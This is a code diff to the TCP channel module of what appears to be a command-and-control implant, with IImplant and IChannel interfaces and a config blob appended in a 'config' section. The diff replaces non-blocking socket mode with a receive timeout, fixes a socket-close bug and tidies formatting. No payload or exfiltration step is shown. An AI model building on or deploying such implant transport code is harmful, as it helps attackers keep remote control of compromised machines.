@@ -110,9 +110,11 @@ BOOL TcpInitialize( CHANNEL_CONTEXT* Context ) {
         goto FAILED;
     }
 
-    dwMode = 1;
-    if (ioctlsocket( Socket, FIONBIO, &dwMode ) != NO_ERROR) {
-        DBG_PRINTF( "ioctlsocket failed: ( %d )\n", WSAGetLastError() );
+    DWORD timeoutMs = 1000;
+    if (setsockopt(
+            Socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeoutMs, sizeof( timeoutMs ) ) ==
+        SOCKET_ERROR) {
+        DBG_PRINTF( "setsockopt failed: ( %d )\n", WSAGetLastError() );
         goto FAILED;
     }
 
@@ -122,7 +124,7 @@ BOOL TcpInitialize( CHANNEL_CONTEXT* Context ) {
 
 FAILED:
     if (Socket != INVALID_SOCKET)
-        closesocket( Context->Socket );
+        closesocket( Socket );
     WSACleanup();
     return FALSE;
 }
@@ -136,15 +138,13 @@ BOOL TcpCleanup( CHANNEL_CONTEXT* Context ) {
     return TRUE;
 }
 
-char __CONFIG__[0] __attribute__((section("config")));
-char * findAppendedConfig() {
-    return (char *)&__CONFIG__;
-}
+char  __CONFIG__[0] __attribute__( ( section( "config" ) ) );
+char* findAppendedConfig() { return (char*)&__CONFIG__; }
 
 BOOL go( IImplant* Implant, IChannel* Channel ) {
     datap            Parser;
     CHANNEL_CONTEXT* Context = NULL;
-    _RESOURCE*       Config  = (_RESOURCE *)findAppendedConfig();
+    _RESOURCE*       Config  = (_RESOURCE*)findAppendedConfig();
 
     Context = RtlAllocateHeap( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( CHANNEL_CONTEXT ) );
     if (Context == NULL) {
